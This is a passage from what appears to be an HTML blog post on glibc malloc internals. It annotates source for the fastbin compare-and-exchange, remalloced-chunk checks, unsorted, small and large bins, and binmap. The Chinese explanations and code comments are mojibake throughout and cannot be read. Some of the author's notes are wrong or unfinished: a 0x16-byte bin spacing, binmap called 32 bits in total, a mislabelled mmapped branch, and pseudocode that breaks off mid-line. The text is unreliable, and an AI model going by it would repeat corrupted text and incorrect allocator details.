(*mem) __gnewval = (newval);			      \</span></span><br><span class="line"><span class="meta">								      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__gret == (oldval))					      \</span></span><br><span class="line"><span class="meta">       *__gmemp = __gnewval;					      \</span></span><br><span class="line"><span class="meta">     __gret; &#125;)</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå®çš„ä½œç”¨æ˜¯,</p>
<p>åŸæœ¬memæŒ‡å‘çš„æ˜¯oldval,ç°åœ¨å°†oldvalä½œä¸ºè¿”å›å€¼,ç„¶åå°†menæŒ‡å‘newval</p>
<p>æ”¾åœ¨åŸæ–‡ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = pp;<span class="comment">//é¦–å…ˆæ‰§è¡Œä¸€æ¬¡,å¦‚æœç¬¬ä¸€æ¬¡victimä¸ºç©º,è¯´æ˜è¿™ä¸ªæ¡¶å­å°±æ˜¯ç©ºçš„,ä¹Ÿå°±ä¸èƒ½ç”¨fastbinè¿›è¡Œåˆ†é…</span></span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">while</span> (</span><br><span class="line">		(pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</span><br><span class="line">      )!= victim</span><br><span class="line">    <span class="comment">//victimæŒ‡å‘é“¾æ ˆé¡¶å †å—,æŠŠä»–å–ä¸‹æ¥,æŠŠåŸæ¥çš„æ¬¡é¡¶å †å—,ä¹Ÿå°±æ˜¯victimçš„åç»§å †å—,æŒ‚åˆ°fbæŒ‡é’ˆä¸Š,è¿”å›å€¼ppæ˜¯victim</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>fbè¿™ä¸ªæ¡¶å­å¤´åŸæœ¬æ˜¯æŒ‡å‘victimè¿™ä¸ªå †å—çš„,</p>
<p>ç°åœ¨è¦è®©fbæŒ‡å‘victimçš„åç»§å †å—,ç„¶åè¿”å›victimç»™pp</p>
<p>æ˜¾ç„¶ppå¿…ç„¶ç­‰äºvictim,ä¹Ÿå°±æ˜¯é¡¶å¤šæ‹¿å‡ºå †é¡¶æ¥,whileå°±ç»“æŸäº†,whileåªä¼šæ‰§è¡Œä¸€æ¬¡</p>
<p>è‡³äºä¸ºå•¥è¦è¿™æ ·å†™å‘¢?å‹è¡Œ</p>
<h5 id="check-remalloced-chunk-A-P-N"><a href="#check-remalloced-chunk-A-P-N" class="headerlink" title="check_remalloced_chunk(A,P,N)"></a>check_remalloced_chunk(A,P,N)</h5><p>å¯¹æœ¬åº”è¯¥å±äºAåˆ†é…åŒºçš„å¤§å°ä½Sçš„å †å—Pè¿›è¡Œæ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"><span class="comment">//æå–på †å—ç»“æ„ä½“ä¸­å­˜æ”¾çš„size,ç”±äºä½ä¸‰ä½æ˜¯æ ‡å¿—å¤ç”¨,ç°åœ¨éœ€è¦å°†å…¶ç›–ä½</span></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))<span class="comment">//å¦‚æœæ˜¯mmapåˆ†é…çš„å †å—</span></span><br><span class="line">      <span class="comment">//å¦‚æœæ˜¯mmapåˆ†é…çš„å †å—,åˆ™</span></span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));<span class="comment">//é¦–å…ˆæ£€æŸ¥ç»™å®šçš„avæ˜¯å¦æ˜¯é¢„æœŸçš„pçš„æ‰€å±åˆ†é…åŒº</span></span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))<span class="comment">//å¦‚æœpä¸æ˜¯ä¸»åˆ†é…åŒºçš„</span></span><br><span class="line">        assert (av != &amp;main_arena);<span class="comment">//æ£€æŸ¥avæ˜¯ä¸æ˜¯ä¸»åˆ†é…åŒº</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);<span class="comment">//æ£€æŸ¥æœ¬å †å—æ˜¯å¦æ­£åœ¨ä½¿ç”¨</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);<span class="comment">//æ£€æŸ¥szå¤§å°æ˜¯å¦å¯¹é½</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE);<span class="comment">//æ£€æŸ¥szå¤§å°æ˜¯å¦å¤§äºæœ€å°åˆ†é…å¤§å°</span></span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));<span class="comment">//æ£€æŸ¥pæŒ‡å‘çš„åœ°å€æ˜¯å¦å¯¹é½</span></span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="unsortedbins"><a href="#unsortedbins" class="headerlink" title="unsortedbins"></a>unsortedbins</h4><p><code>smallbins</code>å’Œ<code>unsortedbins</code>ä¸­å †å—çš„è¿æ¥æ–¹å¼ç›¸åŒ,éƒ½æ˜¯åŒå‘é“¾è¡¨</p>
<p>ä¸¤è€…ä¸åŒçš„æ˜¯,<code>unsortedbin</code>ä¸­å †å—å¯ä»¥å¤§å°å„å¼‚,ä½†æ˜¯<code>smallbin</code>ä¸­ä¸€ä¸ªæ¡¶å­é‡Œçš„å †å—å¿…é¡»ç›¸åŒ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbin2.png" alt="smallbin2"></p>
<p><code>unsortedbin</code>çš„åŒå‘é“¾è¡¨æ²¡æœ‰é•¿çŸ­é™åˆ¶,é‡‡ç”¨å¤´æ’æ³•</p>
<h5 id="unsorted-chunks-M-bin-at-M-1"><a href="#unsorted-chunks-M-bin-at-M-1" class="headerlink" title="unsorted_chunks(M) (bin_at(M, 1))"></a>unsorted_chunks(M) (bin_at(M, 1))</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure>

<p>å–unsortedbinæ¡¶å­å¤´</p>
<h4 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define NSMALLBINS 64</span><br></pre></td></tr></table></figure>

<p>binsçš„ä¸‹æ ‡æ˜¯ä»0åˆ°253,å…¶ä¸­æ¯ä¸ªæ¡¶å­å ç”¨ä¸¤ä¸ªbins,åˆ†åˆ«ä½œä¸ºfdå’ŒbkæŒ‡é’ˆ</p>
<p>smallbinså ç”¨64ä¸ªæ¡¶å­,</p>
<p>å…¶ä¸­ç¬¬1ä¸ªæ¡¶å­æ˜¯unsortedbin,ç¬¬2ä¸ªåˆ°ç¬¬63ä¸ªæ¡¶å­æ˜¯smallbins</p>
<p>ä»ç¬¬64ä¸ªåŠä»¥åçš„æ¡¶å­å°±æ˜¯largebins</p>
<h5 id="next-bin"><a href="#next-bin" class="headerlink" title="next_bin"></a>next_bin</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b) ((mbinptr)((char *)(b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹ä¸€ä¸ªbinå°±æ˜¯<strong>mchunkptræŒ‡é’ˆ</strong>çš„å¤§å°,ä¹Ÿå°±æ˜¯8ä¸ªå­—èŠ‚(åœ¨x64ä¸Š)</p>
<p>å·¦ç§»ä¸€ä½ä¹Ÿå°±æ˜¯ä¹˜ä»¥2,å› ä¸ºæ¯ä¸ªBinå ç”¨ä¸¤ä¸ªbin,åˆ†åˆ«ä½œä¸ºfdå’ŒbkæŒ‡é’ˆ</p>
<h5 id="in-smallbin-range"><a href="#in-smallbin-range" class="headerlink" title="in_smallbin_range"></a>in_smallbin_range</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define in_smallbin_range(sz)  \</span><br><span class="line">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="line">  </span><br><span class="line">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="line"></span><br><span class="line">#define NBINS             128</span><br><span class="line">#define NSMALLBINS         64</span><br><span class="line">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="line">#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="line"></span><br><span class="line">///MALLOC_ALIGNMENT=16</span><br><span class="line">SMALLBIN_CORRECTION=FALSE=0</span><br><span class="line">MIN_LARGE_SIZE=(64-0)*16=1024</span><br></pre></td></tr></table></figure>

<p>smallbinsæœ‰(64-2&#x3D;62)ä¸ªæ¡¶å­,æœ€å¤§ç®¡ç†çš„å †å—ä¸º1023Bytes</p>
<p>å†å¤§ä¸€ä¸ªå­—èŠ‚éƒ½å¾—æ”¾åˆ°largebinä¸­</p>
<p>ä¹Ÿå°±æ˜¯è¯´fastbinsç®¡ç†çš„å †å—å¤§å°ä¹Ÿåœ¨smallbinèŒƒå›´å†…,ä¹Ÿå°±æ˜¯è¯´,<strong>fastbinç›¸å½“äºå‰éƒ¨åˆ†æ¯”è¾ƒå°çš„smallbinsçš„ç¼“å­˜</strong></p>
<h5 id="smallbin-index"><a href="#smallbin-index" class="headerlink" title="smallbin_index"></a>smallbin_index</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))+ SMALLBIN_CORRECTION)</span></span><br><span class="line">	SMALLBIN_WIDTH=MALLOC_ALIGNMENT=<span class="number">16</span>å­—èŠ‚</span><br><span class="line">    SMALLBIN_CORRECTION=<span class="number">0</span></span><br><span class="line">    smallbin_index(sz)=(sz&gt;&gt;<span class="number">4</span>)+<span class="number">0</span>=sz/<span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå‚æ•°szæ˜¯å°†è¯·æ±‚å¤§å°æ¢ç®—æˆå¯¹åº”å †å—æ•´ä½“å¤§å°ä¹‹åçš„å€¼,ä¹Ÿå°±æ˜¯åŒ…æ‹¬äº†å…ƒæ•°æ®</p>
<p>æœ€å°æ˜¯0x20(å…ƒæ•°æ®prev_sizeå’Œsizeå ç”¨0x10,å‰©ä¸‹çš„0x10æ˜¯æœ€å°åˆ†é…è¦æ±‚)</p>
<table>
<thead>
<tr>
<th>å †å—å¤§å°(sz)</th>
<th>index</th>
</tr>
</thead>
<tbody><tr>
<td><strong>unsortedbin</strong></td>
<td>1</td>
</tr>
<tr>
<td><strong>smallbins</strong></td>
<td>[1,63]</td>
</tr>
<tr>
<td><code>[0x20,0x30)</code></td>
<td>2</td>
</tr>
<tr>
<td><code>[0x30,0x40)</code></td>
<td>3</td>
</tr>
<tr>
<td>â€¦.</td>
<td></td>
</tr>
<tr>
<td><code>[0x3f0,0x400)</code></td>
<td>63</td>
</tr>
<tr>
<td>&gt;0x400</td>
<td>largebins</td>
</tr>
</tbody></table>
<h5 id="bin-at"><a href="#bin-at" class="headerlink" title="bin_at"></a>bin_at</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr)(((char *)&amp;((m)-&gt;bins[((i)-1) * 2])) - offsetof(struct malloc_chunk, fd))</span></span><br><span class="line">	<span class="comment">//(m)-&gt;bins[((i)-1) * 2]-16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(s,m) ((size_t)&amp;(((s*)0)-&gt;m))</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œmæ˜¯malloc_stateç»“æ„,iæ˜¯ä½¿ç”¨smallbin_indexå®è®¡ç®—å‡ºçš„å †å—åœ¨smallbinä¸­çš„ä¸‹æ ‡,iä»2å¼€å§‹,å› ä¸ºbins[0]å’Œbins[1]æ˜¯unsortedbinçš„åœ°ç›˜</p>
<p><code>m-&gt;bins[2*(i-1)]</code>æŒ‡å‘çš„æ˜¯ä¸‹æ ‡ä¸º(2*(i-1))çš„æ¡¶å­çš„æ¡¶å­å¤´,å‡å»<code>fd</code>æˆå‘˜åœ¨ä¸€ä¸ªå †å—ä¸­çš„åç§»é‡,å¾—åˆ°çš„æ˜¯è¯¥æ¡¶å­å¤´åŸºå€å¾€å‰16å­—èŠ‚çš„å†…å­˜åœ°å€</p>
<p>æ˜¾ç„¶è¿™ä¸ªåœ°æ–¹æ˜¯æœªçŸ¥çš„,è¿™æ˜¯ä¸ºå•¥å‘¢?</p>
<p>æœ€åå°†è¯¥åœ°å€åˆäº¤ç»™ä¸€ä¸ªmbinpträ¹Ÿå°±æ˜¯malloc_chunk*æŒ‡é’ˆä¿ç®¡</p>
<p>é‚£ä¹ˆæ­¤æ—¶,æ–°æŒ‡é’ˆ+16çš„ä½ç½®åˆšå¥½æ˜¯ä¿®æ­£åçš„fd</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/9c28ec87e40a4ea615599a26bafa58c.png" alt="9c28ec87e40a4ea615599a26bafa58c"></p>
<p>è€Œæ¯ä¸ªæ¡¶å­å¤´èŠ‚ç‚¹è™½ç„¶ä¹Ÿæ˜¯malloc_chunkç±»å‹,ä½†æ˜¯åªéœ€è¦fdå’Œbkä¸¤ä¸ªæŒ‡é’ˆ,å…¶ä»–æˆå‘˜ä¸éœ€è¦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbinhead.png" alt="smallbinhead"></p>
<h5 id="set-inuse-bit-at-offset"><a href="#set-inuse-bit-at-offset" class="headerlink" title="set_inuse_bit_at_offset"></a>set_inuse_bit_at_offset</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p, s) \</span></span><br><span class="line"><span class="meta">  (((mchunkptr)(((char *)(p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<p>å°†sizeå­—æ®µçš„flagä½è®¾ç½®ä¸ŠPREV_INUSE&#x3D;1,è¡¨ç¤ºå‰ä¸€ä¸ªç‰©ç†ç›¸é‚»å—æ­£åœ¨è¢«å ç”¨</p>
<h5 id="do-check-malloced-chunk"><a href="#do-check-malloced-chunk" class="headerlink" title="do_check_malloced_chunk"></a>do_check_malloced_chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> check_malloced_chunk(A, P, N) do_check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_malloced_chunk</span><span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  do_check_remalloced_chunk(av, p, s);</span><br><span class="line">  assert(prev_inuse(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h4><p>smallbinsä¸­çš„æ¯ä¸¤ä¸ªç›¸é‚»çš„æ¡¶å­,å…¶ä¸­å †å—çš„å¤§å°ç›¸å·®0x16å­—èŠ‚(åœ¨x64ä¸Š)</p>
<p>Bin Indexå°±æ˜¯bin_atçš„è®¡ç®—ç»“æœ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å®é™…ä¸Šlargebinså’Œsmallbinså¯ä»¥çœ‹æˆä¸€ä¸ªæ•´ä½“,å‰<span class="number">64</span>ä¸ªæ¡¶å­æ˜¯smallbins</span><br><span class="line">    å‰<span class="number">64</span>ä¸ªæ¡¶å­ç›¸é‚»ä¸¤ä¸ªæ¡¶å­ä¹‹é—´å¤§å°å·®<span class="number">8</span>å­—èŠ‚</span><br><span class="line">   	ç„¶å<span class="number">32</span>ä¸ªæ¡¶å­ç›¸é‚»ä¸¤ä¸ªæ¡¶å­ä¹‹é—´å¤§å°å·®<span class="number">64</span>å­—èŠ‚</span><br><span class="line">    ç„¶å<span class="number">16</span>ä¸ªæ¡¶å­ç›¸é‚»ä¸¤ä¸ªæ¡¶å­ä¹‹é—´å¤§å°å·®<span class="number">512</span>å­—èŠ‚</span><br><span class="line">    ...</span><br><span class="line">	<span class="number">64</span> bins of size       <span class="number">8</span></span><br><span class="line">    <span class="number">32</span> bins of size      <span class="number">64</span></span><br><span class="line">    <span class="number">16</span> bins of size     <span class="number">512</span></span><br><span class="line">     <span class="number">8</span> bins of size    <span class="number">4096</span></span><br><span class="line">     <span class="number">4</span> bins of size   <span class="number">32768</span></span><br><span class="line">     <span class="number">2</span> bins of size  <span class="number">262144</span></span><br><span class="line">     <span class="number">1</span> bin  of size what<span class="number">&#x27;</span>s left</span><br></pre></td></tr></table></figure>



<h5 id="largebin-range"><a href="#largebin-range" class="headerlink" title="largebin_range"></a>largebin_range</h5><p>mallocå‡½æ•°åœ¨åˆ†é…æ—¶,è¶…è¿‡smallbin_rangeå¤§å°çš„å †å—æ‰å¯èƒ½è¢«æ”¾åˆ°largebin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz) \</span></span><br><span class="line"><span class="meta">  ((unsigned long)(sz) &lt; (unsigned long)MIN_LARGE_SIZE)</span></span><br></pre></td></tr></table></figure>



<p>åœ¨x64ä¸Š,MIN_LARGE_SIZE&#x3D;1024</p>
<p>ä¹Ÿå°±æ˜¯è¯´,å¤§äºç­‰äº1024çš„å †å—æ‰å¯èƒ½è¿›å…¥largebin</p>
<h5 id="largebin-index"><a href="#largebin-index" class="headerlink" title="largebin_index"></a>largebin_index</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz)                              \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8             ? largebin_index_64(sz)     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big(sz) \ <span class="comment">//size_sz!=8å¹¶ä¸”å¯¹é½æ˜¯16ä½,è°ƒç”¨largebin_index_32_big</span></span></span><br><span class="line">                            : largebin_index_32(sz))		<span class="comment">//size_sz!=8å¹¶ä¸”å¯¹é½æ˜¯8ä½,è°ƒç”¨largebin_index_32</span></span><br><span class="line">x64ä¸ŠSIZE_SZ=<span class="number">8</span>(ä¸€ä¸ªæŒ‡é’ˆçš„å¤§å°),å› æ­¤è°ƒç”¨largebin_index_64(sz) è¿™ä¸ªå®</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                                                                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long)(sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ? 48 + (((unsigned long)(sz)) &gt;</span>&gt; 6) : ((((unsigned long)(sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ? 91 + (((unsigned long)(sz)) &gt;</span>&gt; 9)   \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 12) <span class="string">&lt;= 10)  ? 110 + (((unsigned long)(sz)) &gt;</span>&gt; 12) \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 15) <span class="string">&lt;= 4)   ? 119 + (((unsigned long)(sz)) &gt;</span>&gt; 15) \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 18) <span class="string">&lt;= 2)   ? 124 + (((unsigned long)(sz)) &gt;</span>&gt; 18) \</span></span><br><span class="line"><span class="meta">                                                                                                                   : 126)</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„å‚æ•°szæ˜¯åŒ…æ‹¬å…ƒæ•°æ®çš„æ•´ä¸ªå †å—å¤§å°</p>
<p>åˆè½åœ¨largebinèŒƒå›´å†…çš„å †å—,æœ€å°æ˜¯1024å­—èŠ‚,å› æ­¤szå³ç§»6ä½å,æœ€å°æ˜¯16,é‚£ä¹ˆç¬¬ä¸€ç»„ä»16åˆ°48,å †å—çš„å¤§å°ä¹Ÿå°±æ˜¯ä»1024åˆ°3072</p>
<p>è¿™äº›å †å—å¯¹åº”çš„æ¡¶ä¸‹æ ‡è®¡ç®—æ–¹å¼ä¸º,å°†å…¶å¤§å°å³ç§»6ä½ç„¶ååŠ ä¸Š48,</p>
<p>ä¹Ÿå°±æ˜¯è¯´,ä¸€ä¸ªæ¡¶å­ä¸­çš„å †å—ä¸€æ ·å¤§,åŒä¸€ç»„å†…ç›¸é‚»ä¸¤ä¸ªæ¡¶å­ä¸­å †å—ç›¸å·®64B</p>
<table>
<thead>
<tr>
<th>largebinså †å—å¤§å°</th>
<th>ä¸‹æ ‡</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>[1024,1087)</td>
<td>64</td>
<td></td>
</tr>
<tr>
<td>[1088,1151)</td>
<td>65</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>[3072,3135)</td>
<td>96</td>
<td>è¿™å—å„¿åˆ°åº•å¡åˆ°å“ªé‡Œæˆ‘ä¹Ÿä¸çŸ¥é“</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span> bins of size       <span class="number">8</span></span><br><span class="line">   <span class="number">32</span> bins of size      <span class="number">64</span></span><br><span class="line">   <span class="number">16</span> bins of size     <span class="number">512</span></span><br><span class="line">    <span class="number">8</span> bins of size    <span class="number">4096</span></span><br><span class="line">    <span class="number">4</span> bins of size   <span class="number">32768</span></span><br><span class="line">    <span class="number">2</span> bins of size  <span class="number">262144</span></span><br><span class="line">    <span class="number">1</span> bin  of size what<span class="number">&#x27;</span>s left</span><br></pre></td></tr></table></figure>

<p>æ•´ä¸ªlargebinä¸­æœ‰6ç»„æ¡¶å­,ç¬¬ä¸€ç»„å ç”¨32ä¸ªBins,ç›¸é‚»ä¸¤ä¸ªæ¡¶å­ä¹‹é—´çš„å †å—ç›¸å·®64B</p>
<p>ç¬¬äºŒç»„å ç”¨16ä¸ªBins,ç›¸é‚»ä¸¤ä¸ªæ¡¶å­ä¹‹é—´çš„å †å—ç›¸å·®16B</p>
<p>â€¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(sz/64&lt;=48)&#123;</span><br><span class="line">	return 48+sz/64</span><br><span class="line">&#125;else if(sz/512&lt;=20)&#123;</span><br><span class="line">	return 91+sz/512</span><br><span class="line">&#125;else if(sz/4096&lt;=10)&#123;</span><br><span class="line">	return 110+sz/4096</span><br><span class="line">&#125;else if(sz/)</span><br></pre></td></tr></table></figure>





<h4 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSHIFT 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP (1U &lt;&lt; BINMAPSHIFT)  </span></span><br><span class="line">	BITSPERMAP=<span class="number">32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE (NBINS / BITSPERMAP)</span></span><br><span class="line">	BINMAPSIZE=<span class="number">128</span>/<span class="number">32</span>=<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br></pre></td></tr></table></figure>



<p>binmapæ˜¯ä¸€ä¸ª4ä¸ªintçš„æ•°ç»„,å…±32ä½,ä¸ç®¡æ˜¯x64è¿˜æ˜¯x86éƒ½æ˜¯32ä½,ç”¨äºæ ‡è®°32ä¸ªlargebinä¸­æ˜¯å¦æœ‰ç©ºé—²çš„å †å—</p>
<p>ç”¨äºåŠ å¿«largebinä¸­åˆ†é…å †å—æ—¶çš„æœ€é€‚å¯»æ‰¾å·¥ä½œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)</span></span><br></pre></td></tr></table></figure>

<p>iæ˜¯largebinsä¸‹æ ‡,å³ç§»5ä½ä¹Ÿå°±æ˜¯é™¤ä»¥32è®¡ç®—å¾—åˆ°å±äºiä¸‹æ ‡çš„æ¡¶å­å±äºmap[0]è¿˜æ˜¯map[1],map[2],map[3]å“ªä¸€ä¸ªç®¡ç†</p>
<p>ä¸€ä¸ªblockä¹Ÿå°±æ˜¯8ä¸ªæ¡¶å­å½’ä¸€ä¸ªmapç®¡</p>
